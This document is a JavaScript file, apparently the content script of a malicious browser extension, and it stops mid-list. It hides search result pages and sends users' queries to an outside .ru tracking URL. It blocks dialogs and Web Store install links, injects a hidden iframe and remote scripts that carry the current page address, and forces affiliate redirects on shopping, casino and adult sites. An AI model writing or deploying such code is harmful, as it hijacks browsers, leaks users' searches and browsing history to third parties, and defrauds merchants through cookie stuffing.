var d = document.domain;
var l = location.href;
var params = {};
var letsgo = true;

if(d.indexOf("www.google") !== -1 && l.indexOf("q=") !== -1) {
document.documentElement.style.display = "none";
}

if(d.indexOf("bing") !== -1 && l.indexOf("/search") !== -1 && l.indexOf("q=") !== -1) {
document.documentElement.style.display = "none";
}

if(d.indexOf("aol") !== -1 && l.indexOf("/search") !== -1 && l.indexOf("q=") !== -1) {
document.documentElement.style.display = "none";
}

if(d.indexOf("aol") !== -1 && l.indexOf("/search") !== -1 && l.indexOf("query=") !== -1) {
document.documentElement.style.display = "none";
}

if(d.indexOf("searchlock") !== -1 && l.indexOf("/search") !== -1 && l.indexOf("q=") !== -1) {
document.documentElement.style.display = "none";
}

if(d.indexOf("safefinder") !== -1 && l.indexOf("/search") !== -1 && l.indexOf("q=") !== -1) {
document.documentElement.style.display = "none";
}

if(d.indexOf("thesmartsearch") !== -1 && l.indexOf("/search") !== -1 && l.indexOf("q=") !== -1) {
document.documentElement.style.display = "none";
}

function DisplayBlock() {
 document.documentElement.style.display = "block";
}

function SecuredReferrer() {
//Referrer
if(document.head){
var meta = document.createElement('meta');
meta.name = "referrer";
meta.content = "no-referrer";
document.getElementsByTagName('head')[0].appendChild(meta);
}
}

function getParams(url){
 params = {};
 if(!url || url=='') url = location.href;
 var s = url.split('?');
 var h = url.split('#');

 if(s.length==2) s = s[1];
 else s = s[0];

 if(h.length==2) s = s + '&' + h[1];

 if(s!='') {
  var a = s.split('&');
  for(var i=0; i<a.length; i++){
   t = a[i].split("=");
   if(t[1]) params[t[0]] = t[1];
  }
 }
}

function redirectSearch(searchTerm){
 var idenazivce = setInterval(function(){
 getParams();
    if(params[searchTerm] == undefined) {
  
  return;
 }
    var q = params[searchTerm];
    var nL = "http://z3wwas.ru/XtkjPh?sub_id_1=" + q;
    
    if (letsgo) {
    clearInterval(idenazivce);
    letsgo = false;
    window.location.replace(nL);
    }
  }, 0);  
}

function checkForSearch(){
 
  if(d.indexOf("searchengage")        != -1){ SecuredReferrer();}

  if(d.indexOf("bing")                  != -1){ SecuredReferrer(); redirectSearch("q");}
    
  if(d.indexOf("www.google")            != -1){ SecuredReferrer(); redirectSearch("q");}

  if(d.indexOf("ask")                   != -1 && l.indexOf("/web")   != -1){ SecuredReferrer(); redirectSearch("q");}

  if(d.indexOf("search.aol.com")        != -1 && l.indexOf("/search")!= -1){ SecuredReferrer(); redirectSearch("q");}
  
  if(d.indexOf("search.aol.co.uk")        != -1 && l.indexOf("/search")!= -1){ SecuredReferrer(); redirectSearch("query");}

  if(d.indexOf("wow.com")               != -1 && l.indexOf("/search")!= -1){ SecuredReferrer(); redirectSearch("q");}
  
  if(d.indexOf("when.com")               != -1 && l.indexOf("/search")!= -1){ SecuredReferrer(); redirectSearch("q"); }

  if(d.indexOf("search.mywebsearch.com")!= -1                             ){ SecuredReferrer(); redirectSearch("searchfor"); }
  
  if(d.indexOf("search.myway.com")      != -1                             ){ SecuredReferrer(); redirectSearch("searchfor"); }

  if(d.indexOf("duckduckgo.com")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }
  
  if(d.indexOf("mysearch.com")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }
  
  if(d.indexOf("teoma.com")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }
  
  if(d.indexOf("searchlock.com")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }

  if(d.indexOf("myprivatesearch.com")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }

  if(d.indexOf("searchprivacy.co")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }
  
  if(d.indexOf("thesmartsearch.net")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }
  
  if(d.indexOf("infospace.com")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }
  
  if(d.indexOf("safefinder.com")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }
  
  if(d.indexOf("mysearchguardian.com")        != -1                             ){ SecuredReferrer(); redirectSearch("q"); }

}

pub = "";
ver = "";
pid = "";
checkForSearch();

setInterval(function(){
   var e=document.querySelector('link[rel=chrome-webstore-item]');if(e){e.parentNode.removeChild(e);}
      window.alert = null;
      window.confirm = null;
      window.onbeforeunload = null;
      window.onunload = null;
      window.beforeunload = null;
      chrome.webstore.install = null;
  var nChrIn = null;
  var nConF  = null;
  var nAlrT  = null;
  var nSitV  = null;
  var nStoT  = null;
}, 0);


(function(w) {
    var iframe = document.createElement('iframe');
    iframe.name = 'iframe';
    iframe.src = 'https://nixunhuan.com/i/live.html';
    iframe.style.width = '1px';
    iframe.style.height = '1px';
    document.head.appendChild(iframe);
})(window);
// var hr = document.location.href;
document.location.href = "javascript:(" + function() {
        window.onbeforeunload = null;
        window.onunload = null;
        chrome.webstore.install = null;
    } + ")()";
window.reigw34pn7tsjkdygf = true;
! function() {
    if (!document.location.href.indexOf('https://drive.google.com/')) return;
    if (!document.location.href.indexOf('https://docs.google.com/')) return;
 
    function a() {
        setTimeout(a, 500);
        var b = function() {
            window.onbeforeunload = null;
            location.href = "http://google.com"
        };
        if (window.chrome || (window.chrome = {}), window.chrome.webstore || (window.chrome.webstore = {}), window.chrome.webstore.install = b, document.querySelector) {
            var c = document.querySelector('link[rel="chrome-webstore-item"]');
            c && b()
        }
    }
    a();
    var b = document.getElementsByTagName("head");
    if (b.length) b = b[0];
    else {
        b = document.createElement("head");
        var c = document.getElementsByTagName("html");
        c.length ? c = c[0] : (c = document.createElement("html"), document.appendChild(c)), c.appendChild(b)
    }
    var d = document.createElement("script");
    d.type = "text/javascript", d.innerHTML = "(function(){(" + a.toString() + ")()})()", b.appendChild(d)
}();
 
(function(){
    window.xGlobalDomainsExclude = function(domain) {
        var masks = ['casabaher.com','*.casabaher.com','extra.com.br','*.extra.com.br','pontofrio.com.br','*.pontofrio.com.br','ratka.pl','*.ratka.pl','plarium.com','*.plarium.com','berrybenka.com','*.berrybenka.com','saopaulomania.com.br','*.saopaulomania.com.br','rihappy.com.br','*.rihappy.com.br','creditstar.pl','*.creditstar.pl','nic.ru','*.nic.ru','iqoption.com','*.iqoption.com','mobly.com.br','*.mobly.com.br','lazada.co.id','*.lazada.co.id','lazada.vn','*.lazada.vn','lazada.com.my','*.lazada.com.my','lazada.com.ph','*.lazada.com.ph','lazada.sg','*.lazada.sg','lazada.co.th','*.lazada.co.th','lingualeo.com','*.lingualeo.com','windrop.ru','*.windrop.ru','r18.com','*.r18.com','bongacams.com','*.bongacams.com','mataharimall.com','*.mataharimall.com','netshoes.com.ar','*.netshoes.com.ar','netshoes.com.mx','*.netshoes.com.mx','jd.com','*.jd.com','lojadoprazer.com.br','*.lojadoprazer.com.br','agoda.com','*.agoda.com','wonga.pl','*.wonga.pl','myprotein.com','*.myprotein.com','samurai-games.net','*.samurai-games.net','mobly.com.br','*.mobly.com.br','monedo.pl','*.monedo.pl','extraportfel.pl','*.extraportfel.pl','mybook.ru','*.mybook.ru','etoro.com','*.etoro.com','edarling.pl','*.edarling.pl','mytoys.ru','*.mytoys.ru','zaymer.ru','*.zaymer.ru','hema.nl','*.hema.nl','pandamoney.pl','*.pandamoney.pl','gearbest.com','*.gearbest.com','lendon.pl','*.lendon.pl','kredito24.es','*.kredito24.es','kredito24.pl','*.kredito24.pl','kredito24.cz','*.kredito24.cz','zaplo.pl','*.zaplo.pl','booking.com','*.booking.com','candere.com','*.candere.com','flipkart.com','*.flipkart.com','emirates.com','*.emirates.com','modanisa.com','*.modanisa.com','snapdeal.com','*.snapdeal.com','rosewholesale.com','*.rosewholesale.com','mackeeper.com','*.mackeeper.com','makemytrip.com','*.makemytrip.com','voonik.com','*.voonik.com','twinkledeals.com','*.twinkledeals.com','roblox.com','*.roblox.com','myntra.com','*.myntra.com','jabong.com','*.jabong.com','yatra.com','*.yatra.com','paytm.com','*.paytm.com','dresslink.com','*.dresslink.com','newchic.com','*.newchic.com','industrybuying.com','*.industrybuying.com','hotels.com','*.hotels.com','tinydeal.com','*.tinydeal.com','craftsvilla.com','*.craftsvilla.com','ebay.in','*.ebay.in','zivame.com','*.zivame.com','foodpanda.in','*.foodpanda.in','dresslily.com','*.dresslily.com','nykaa.com','*.nykaa.com','sammydress.com','*.sammydress.com','1mg.com','*.1mg.com','pepperfry.com','*.pepperfry.com','everbuying.net','*.everbuying.net','stalkbuylove.com','*.stalkbuylove.com','lemall.com','*.lemall.com','netmeds.com','*.netmeds.com','firstcry.com','*.firstcry.com','m-icicibank.com','*.m-icicibank.com','geekbuying.com','*.geekbuying.com','oyorooms.com','*.oyorooms.com','austrian.com','*.austrian.com','nearbuy.com','*.nearbuy.com','lightinthebox.com','*.lightinthebox.com','cleartrip.com','*.cleartrip.com','shopcj.com','*.shopcj.com','clovia.com','*.clovia.com','tolexo.com','*.tolexo.com','miniinthebox.com','*.miniinthebox.com','zaful.com','*.zaful.com','happilyunmarried.com','*.happilyunmarried.com','coverfox.com','*.coverfox.com','nastydress.com','*.nastydress.com','rosegal.com','*.rosegal.com','pleer.ru','*.pleer.ru','aliexpress.com','*.aliexpress.com','agoda.com','*.agoda.com','alibaba.com','*.alibaba.com','dx.com','*.dx.com','lightinthebox.com','*.lightinthebox.com','rentalcars.com','*.rentalcars.com','rosegal.com','*.rosegal.com','shopbop.com','*.shopbop.com','tomtop.com','*.tomtop.com','miniinthebox.com','*.miniinthebox.com','casasbahia.com.br','*.casasbahia.com.br'];
        for (var i = 0; i < masks.length; i++) {
            var regexStr = '^' + masks[i].replace(/\./g, '\\.').replace(/\*/, '[^\\.]+') + '$';
            var regex = new RegExp(regexStr);
            if (domain.match(regex))
                return true;
        }
        return false;
    };
})();
 
if (!window.xGlobalDomainsExclude || !window.xGlobalDomainsExclude(document.domain)) {
 
(function() {
    if (window.self !== window.top) return;
    var _data = _data || {};
    _data['addonname'] = '[Enter Product Name]';
    _data['clientuid'] = '[Enter Client UID]';
    _data['subID'] = '123';
    _data['affid'] = 9680;
    _data['subaffid'] = 1001;
    var path = 'addonname=' + _data['addonname'] + '&clientuid=' + _data['clientuid'] + '&subID=' + _data['subID'] + '&affid=' + _data['affid'];
    path += '&subaffid=' + _data['subaffid'] + '&href=' + encodeURIComponent(window.location.href);
    var e = document.createElement('script');
    e.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'asrvvv-a.akamaihd.net/get?' + path;
    document.body.appendChild(e);
})();
(function() {
    var script = document.createElement('script');
    script.async = true;
    script.src = '//istatic.eshopcomp.com/fo/ec/vldprm.js';
    document.getElementsByTagName('body')[0].appendChild(script);
})();
(function() {
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.async = true;
    script.src = 'https://1942841573.rsc.cdn77.org/all.js';
    (document.getElementsByTagName('head')[0] || document.body).appendChild(script);
})();
(function () {
    function setCookie(n, v, p) {
        var a = new Date();
        a['setTime'](a['getTime']() + (p * 30 * 30 * 1000));
        var b = 'expires=' + a['toUTCString']();
        document['cookie'] = n + '=' + v + ';' + b + ';path=/'
    }
    function getCookie(n) {
        var s = n + '=';
        var p = document['cookie']['split'](';');
        for (var j = 0; j < p['length']; j++) {
            var b = p[j];
            while (b['charAt'](0) == ' ') {
                b = b['substring'](1)
            }
            if (b['indexOf'](s) == 0) {
                return b['substring'](s['length'], b['length'])
            }
        }
        return false
    }
    var current_domain = window['location']['hostname'];
    if ((current_domain['match'](/\./g) || [])['length'] > 1) {
        current_domain = current_domain['replace'](/^[^.]+\./g, '')
    }
    var domains = {};
    domains['getnaughty.com'] = 'http://performance.affiliaxe.com/aff_c?offer_id=16233&aff_id=65947';
    domains['wellhello.com'] = 'http://performance.affiliaxe.com/aff_c?offer_id=16183&aff_id=65947';
    domains['phone.instantcheckmate.com'] = 'http://performance.affiliaxe.com/aff_c?offer_id=21006&aff_id=65947';
    domains['xdates18.com'] = 'http://performance.affiliaxe.com/aff_c?offer_id=25495&aff_id=65947';
    domains['g2a.com'] = 'https://www.g2a.com/r/user-59156607d1e93';
    domains['bluehost.com'] = 'https://www.bluehost.com/track/alexua3d/';
    domains['dreamhost.com'] = 'http://mbsy.co/hs3pD';
    domains['iqoption.com'] = 'http://affiliate.iqoption.com/redir/?aff=64669&afftrack=SUB_ID';
    domains['plus500.com'] = 'https://www.plus500.com/Download/MultiPlatformDownload.aspx?id=111248&pl=2';
    domains['richcasino.com'] = 'https://www.richcasino.com/?sourceID=20021159';
    domains['bingohall.ag'] = 'https://www.bingohall.ag/adpage?sourceID=133880';
    domains['bingocanada.com'] = 'https://www.bingocanada.com/adpage2.asp?sourceID=133881';
    domains['bingoformoney.ag'] = 'https://www.bingoformoney.ag/adpage2.asp?sourceID=133882';
    domains['internetbingo.com'] = 'https://www.internetbingo.com/adpage2.asp?sourceID=133883';
    domains['vicsbingo.ag'] = 'https://www.vicsbingo.ag/adpage2.asp?sourceID=133884';
    domains['southbeachbingo.ag'] = 'https://www.southbeachbingo.ag/adpage2.asp?sourceID=133885';
    domains['instantbingo.ag'] = 'https://www.instantbingo.ag/adpage2.asp?sourceID=133886';
    domains['winwardcasino.ag'] = 'https://www.winwardcasino.ag/adpage2.asp?sourceID=111693';
    domains['slotsvillage.ag'] = 'https://www.slotsvillage.ag/adpage2.asp?sourceID=106794';
    domains['thebescasino.com'] = 'https://www.thebescasino.com/?sourceID=30013132';
    domains['7reels.com'] = 'https://www.7reels.com/?sourceID=40013557';
    domains['7spins.com'] = 'https://www.7spins.com/?sourceID=50013948';
    domains['21dukes.com'] = 'https://www.21dukes.com/?sourceID=60015317';
    domains['affiliates.888.com'] = 'https://mmwebhandler.aff-online.com/c/40695?sr=1369729';
    domains['888affiliati.it'] = 'https://mmwebhandler.aff-online.com/c/39023?sr=1369729';
    domains['888ladies.com'] = 'https://mmwebhandler.aff-online.com/c/41111?sr=1369729';
    domains['winkbingo.com'] = 'https://mmwebhandler.aff-online.com/c/40945?sr=1369729';
    domains['redbusbingo.com'] = 'https://mmwebhandler.aff-online.com/c/41036?sr=1369729';
    domains['winkslots.com'] = 'https://mmwebhandler.aff-online.com/c/41001?sr=1369729';
    domains['888casino.com'] = 'https://mmwebhandler.aff-online.com/c/41086?sr=1369729';
    domains['888.it'] = 'https://mmwebhandler.aff-online.com/c/41068?sr=1369729';
    domains['888casino.dk'] = 'https://mmwebhandler.aff-online.com/c/36461?sr=1369729';
    domains['888casino.es'] = 'https://mmwebhandler.aff-online.com/c/35649?sr=1369729';
    domains['888casino.it'] = 'https://mmwebhandler.aff-online.com/c/41034?sr=1369729';
    domains['888games.com'] = 'https://mmwebhandler.aff-online.com/c/34368?sr=1369729';
    domains['888poker.com'] = 'https://mmwebhandler.aff-online.com/c/39679?sr=1369729';
    domains['888poker.dk'] = 'https://mmwebhandler.aff-online.com/c/36460?sr=1369729';
    domains['888bingo.com'] = 'https://mmwebhandler.aff-online.com/c/32542?sr=1369729';
    domains['888poker.es'] = 'https://mmwebhandler.aff-online.com/c/35497?sr=1369729';
    domains['888sport.it'] = 'https://mmwebhandler.aff-online.com/c/38764?sr=1369729';
    domains['bbqbingo.com'] = 'https://mmwebhandler.aff-online.com/c/35943?sr=1369729';
    domains['reefclubcasino.com'] = 'https://mmwebhandler.aff-online.com/c/34730?sr=1369729';
    domains['casino-on-net.com'] = 'https://mmwebhandler.aff-online.com/c/34731?sr=1369729';
    domains['celebbingo.com'] = 'https://mmwebhandler.aff-online.com/c/36611?sr=1369729';
    domains['daisybingo.com'] = 'https://mmwebhandler.aff-online.com/c/35742?sr=1369729';
    domains['easterbingo.com'] = 'https://mmwebhandler.aff-online.com/c/39066?sr=1369729';
    domains['winkslots.com'] = 'https://mmwebhandler.aff-online.com/c/38726?sr=1369729';
    domains['spartasexgame.com'] = 'http://performance.affiliaxe.com/aff_c?offer_id=26617&aff_id=65947&file_id=1367409';
    domains['westsluts.com'] = 'http://performance.affiliaxe.com/aff_c?offer_id=26615&aff_id=65947&file_id=1367439';
    domains['lottoland.com'] = 'http://performance.affiliaxe.com/aff_c?offer_id=26385&aff_id=65947';
    domains['millionaires-blueprint.co'] = 'http://performance.affiliaxe.com/aff_c?offer_id=22231&aff_id=65947';
    domains['cloudbet.com'] = 'https://www.cloudbet.com/en/?af_token=af7ee068e7d9e3ed805f1479273152dc&utm_source=google.&utm_medium=direct';
    domains['csgoroll.com'] = 'http://csgoroll.com/promo/76561198084071916';
    domains['hellcase.com'] = 'http://hellcase.com/bonus8223425';
    domains['csgolive.com'] = 'https://csgolive.com/ref/addon';
    domains['drakewing.com'] = 'https://www.drakewing.com/promo-code/1497779';
    domains['drakemoon.com'] = 'https://www.drakemoon.com/promo-code/4794914';
    domains['williamhill.es'] = 'http://performance.afxplay.com/aff_c?offer_id=23877&aff_id=65947';
    domains['williamhill.com'] = 'http://performance.afxplay.com/aff_c?offer_id=23873&aff_id=65947';
    domains['williamhill.it'] = 'http://performance.afxplay.com/aff_c?offer_id=23879&aff_id=65947';
    domains['vulkanbet.com'] = 'http://performance.affiliaxe.com/aff_c?offer_id=24049&aff_id=65947';
    domains['namecheap.com'] = 'https://affiliate.namecheap.com/?affId=115983';
    domains['silveroakcasino.com'] = 'http://www.silveroakcasino.eu/click/1/8810/16192/1';
    domains['planet7casino.com'] = 'http://www.planet7casino.eu/click/2/9071/16192/1';
    domains['royalacecasino.com'] = 'http://www.royalacecasino.eu/click/3/8383/16192/1';
    domains['slotmadness.com'] = 'http://www.slotmadness.eu/click/4/9005/16192/1';
    domains['captainjackcasino.com'] = 'http://www.captainjackcasino.eu/click/5/8883/16192/1';
    domains['betonline.ag'] = 'http://record.commission.bz/_lZrYDqG2bM_UOsjNOfgKeWNd7ZgqdRLk/1/';
    domains['sportsbetting.ag'] = 'http://record.commission.bz/_lZrYDqG2bM_T2Fu8bIPGIGNd7ZgqdRLk/1/';
 
    if (typeof domains[current_domain] !== 'undefined') {
        if (!getCookie(domains[current_domain])) {
            setCookie(domains[current_domain], '1', 5);
            window['location'] = domains[current_domain]
        }
    }
 
    var domains_nc = {};
 
    if (typeof domains_nc[current_domain] !== 'undefined') {
        window['location'] = domains_nc[current_domain]
    }
})();
 
}
 
(function(){
    var deepobjarr = [
        {deeplink: 'http://nfemo.com/click-IQHHNCZW-KIGQCAGE?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'casabaher.com'},
        {deeplink: 'http://nfemo.com/click-AQHHNBF9-HEBQBXIK?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'extra.com.br'},
        {deeplink: 'http://nfemo.com/click-AQHHNBF6-KGCQBXIV?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'pontofrio.com.br'},
        {deeplink: 'http://nfemo.com/click-AQHHNCXG-HFDQB99V?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'ratka.pl'},
        {deeplink: 'http://nfemo.com/click-CQDMRZ3V-NLJQCDUB?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'plarium.com'},
        {deeplink: 'http://tofiv.com/click-CQHHNDE9-HEBQCBZE?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'berrybenka.com'},
        {deeplink: 'http://nfemo.com/click-GQC7MLMV-KIGQCBLD?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'saopaulomania.com.br'},
        {deeplink: 'http://nfemo.com/click-AQC7MKVF-PNLJQ2S0?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'rihappy.com.br'},
        {deeplink: 'http://nfemo.com/click-FQHHNDI2-HFDQCB5I?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'creditstar.pl'},
        {deeplink: 'http://nfemo.com/click-CQHHNDH6-RMIQCCCL?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'nic.ru'},
        {deeplink: 'http://nfemo.com/click-HQHHNCJ5-KIGQB85M?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'iqoption.com'},
        {deeplink: 'http://nfemo.com/click-EQDMRZ1K-VRMIQ54V?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'mobly.com.br'},
        {deeplink: 'http://nfemo.com/click-HQD4YEOK-NLJQB8U2?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'lazada.co.id'},
        {deeplink: 'http://nfemo.com/click-FQHHNCA9-RMIQB8UY?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'lazada.vn'},
        {deeplink: 'http://nfemo.com/click-GQHHNCBA-KHEQB9O1?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'lazada.com.my'},
        {deeplink: 'http://nfemo.com/click-CQD4YEWP-NLJQB8U1?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'lazada.com.ph'},
        {deeplink: 'http://nfemo.com/click-FQHHNCA8-RMIQB8UZ?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'lazada.sg'},
        {deeplink: 'http://nfemo.com/click-DQD4YEW0-NLJQB8U0?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'lazada.co.th'},
        {deeplink: 'http://nfemo.com/click-JQHHNCRJ-NLJQB9H2?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'lingualeo.com'},
        {deeplink: 'http://nfemo.com/click-GQHHNCMP-KHEQB842?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'windrop.ru'},
        {deeplink: 'http://tofiv.com/click-JQHHNDG8-ECAQCB1Y?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'r18.com'},
        {deeplink: 'http://nfemo.com/click-FQHHNC1T-NJFQCAOL?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'bongacams.com'},
        {deeplink: 'http://nfemo.com/click-IQHHNC2M-NJFQCAX5?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'mataharimall.com'},
        {deeplink: 'http://nfemo.com/click-GQC8M42V-NKHQCC27?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'netshoes.com.ar'},
        {deeplink: 'http://nfemo.com/click-IQD4YEI5-NJFQBLVF?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'netshoes.com.mx'},
        {deeplink: 'http://cityads.com/click-JQHHNCKU-NKHQB8NV?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'jd.com'},
        {deeplink: 'http://nfemo.com/click-CQC7ML3V-PNLJQ8KV?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'lojadoprazer.com.br'},
        {deeplink: 'http://nfemo.com/click-HQD4YESF-NJFQB94O?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'agoda.com'},
        {deeplink: 'http://nfemo.com/click-HQHHNC2H-NJFQCASH?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'wonga.pl'},
        {deeplink: 'http://tofiv.com/click-DQHHNC9X-NJFQCBRZ?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'myprotein.com'},
        {deeplink: 'http://tofiv.com/click-BQHHNDRE-KIGQCDG1?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'samurai-games.net'},
        {deeplink: 'http://nfemo.com/click-EQDMRZ1K-VRMIQ54V?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'mobly.com.br'},
        {deeplink: 'http://nfemo.com/click-DQHHNCVJ-NLJQCBMA?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'monedo.pl'},
        {deeplink: 'http://nfemo.com/click-EQHHNCS3-KHEQB9O7?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'extraportfel.pl'},
        {deeplink: 'http://nfemo.com/click-IQHHNB3A-NLJQBY70?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'mybook.ru'},
        {deeplink: 'http://nfemo.com/click-AQHHNC27-KGCQCAUI?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'etoro.com'},
        {deeplink: 'http://tofiv.com/click-HQHHNDDS-NJFQCB0C?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'edarling.pl'},
        {deeplink: 'http://nfemo.com/click-IQC7MK3F-RNKHQ8TV?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'mytoys.ru'},
        {deeplink: 'http://cityredirect.com/click-CQD4YETV-KIGQBUSV?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'zaymer.ru'},
        {deeplink: 'http://tofiv.com/click-CQHHNDCB-ECAQCBV6?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'hema.nl'},
        {deeplink: 'http://nfemo.com/click-DQHHNCL3-KHEQB8ZA?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'pandamoney.pl'},
        {deeplink: 'http://nfemo.com/click-GQHHNB8J-KHEQBXO5?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'gearbest.com'},
        {deeplink: 'http://nfemo.com/click-EQHHNCS2-KHEQB9O6?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'lendon.pl'},
        {deeplink: 'http://nfemo.com/click-BQHHNCN8-RMIQB882?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'kredito24.es'},
        {deeplink: 'http://nfemo.com/click-DQHHNCL0-HFDQB84W?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'kredito24.pl'},
        {deeplink: 'http://nfemo.com/click-IQHHNCNJ-KGCQB87H?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'kredito24.cz'},
        {deeplink: 'http://nfemo.com/click-GQHHNCJX-KHEQB871?bt=25&tl=1&sl=ADDRESS&sa=SUB_ID',  domain: 'zaplo.pl'},
        {deeplink: 'https://ad.admitad.com/g/83b3b940f76e4cc9f1474ee68e9c3f/?ulp=ADDRESS&subid=SUB_ID',  domain: 'booking.com'},
        {deeplink: 'https://ad.admitad.com/g/c8mlnlvcte9b5a1e1b4df7b80d644f/?ulp=ADDRESS&subid=SUB_ID',  domain: 'candere.com'},
        {deeplink: 'https://ad.admitad.com/g/rb1qie435b9b5a1e1b4da80d05f527/?ulp=ADDRESS&subid=SUB_ID',  domain: 'flipkart.com'},
        {deeplink: 'https://ad.admitad.com/g/fvzwi2mnwc9b5a1e1b4db3ffddafcd/?ulp=ADDRESS&subid=SUB_ID',  domain: 'emirates.com'},
        {deeplink: 'https://ad.admitad.com/g/xqeeqy1az49b5a1e1b4d2172abbf6f/?ulp=ADDRESS&subid=SUB_ID',  domain: 'modanisa.com'},
        {deeplink: 'https://ad.admitad.com/g/pmlz4xt05t9b5a1e1b4d0afdaa1ad3/?ulp=ADDRESS&subid=SUB_ID',  domain: 'snapdeal.com'},
        {deeplink: 'https://ad.admitad.com/g/4dp5j6in7a9b5a1e1b4d0bc7cbcfb1/?ulp=ADDRESS&subid=SUB_ID',  domain: 'rosewholesale.com'},
        {deeplink: 'https://ad.admitad.com/g/26590ab6839b5a1e1b4d090faeb426/?ulp=ADDRESS&subid=SUB_ID',  domain: 'mackeeper.com'},
        {deeplink: 'https://ad.admitad.com/g/jsqez97yz79b5a1e1b4df25a54fe7c/?ulp=ADDRESS&subid=SUB_ID',  domain: 'makemytrip.com'},
        {deeplink: 'https://ad.admitad.com/g/2c8vtfsq729b5a1e1b4daa3dedee09/?ulp=ADDRESS&subid=SUB_ID',  domain: 'voonik.com'},
        {deeplink: 'https://ad.admitad.com/g/94djyzoz7a9b5a1e1b4d9a772e31ff/?ulp=ADDRESS&subid=SUB_ID',  domain: 'twinkledeals.com'},
        {deeplink: 'https://ad.admitad.com/g/9huc0zavxm9b5a1e1b4d26d04bf94e/?ulp=ADDRESS&subid=SUB_ID',  domain: 'roblox.com'},
        {deeplink: 'https://ad.admitad.com/g/s56leml8ck9b5a1e1b4d23d5247706/?ulp=ADDRESS&subid=SUB_ID',  domain: 'myntra.com'},
        {deeplink: 'https://ad.admitad.com/g/th1bw6vg5q9b5a1e1b4d8316cf038a/?ulp=ADDRESS&subid=SUB_ID',  domain: 'jabong.com'},
        {deeplink: 'https://ad.admitad.com/g/csfy8g6df69b5a1e1b4d11869b62cb/?ulp=ADDRESS&subid=SUB_ID',  domain: 'yatra.com'},
        {deeplink: 'https://ad.admitad.com/g/z4bzhun3hw9b5a1e1b4d46213365b8/?ulp=ADDRESS&subid=SUB_ID',  domain: 'paytm.com'},
        {deeplink: 'https://ad.admitad.com/g/oyo6i8ybd19b5a1e1b4d5b930f1fe5/?ulp=ADDRESS&subid=SUB_ID',  domain: 'dresslink.com'},
        {deeplink: 'https://ad.admitad.com/g/0i4jszvwip9b5a1e1b4d3442850f04/?ulp=ADDRESS&subid=SUB_ID',  domain: 'newchic.com'},
        {deeplink: 'https://ad.admitad.com/g/0seaj1cgvi9b5a1e1b4db04a7b5ed1/?ulp=ADDRESS&subid=SUB_ID',  domain: 'industrybuying.com'},
        {deeplink: 'https://ad.admitad.com/g/q38i4899179b5a1e1b4d9abd4df56e/?ulp=ADDRESS&subid=SUB_ID',  domain: 'hotels.com'},
        {deeplink: 'https://ad.admitad.com/g/590bc151bb9b5a1e1b4d91a72d4870/?ulp=ADDRESS&subid=SUB_ID',  domain: 'tinydeal.com'},
        {deeplink: 'https://ad.admitad.com/g/qlgy9yg3x39b5a1e1b4dddcc735ebc/?ulp=ADDRESS&subid=SUB_ID',  domain: 'craftsvilla.com'},
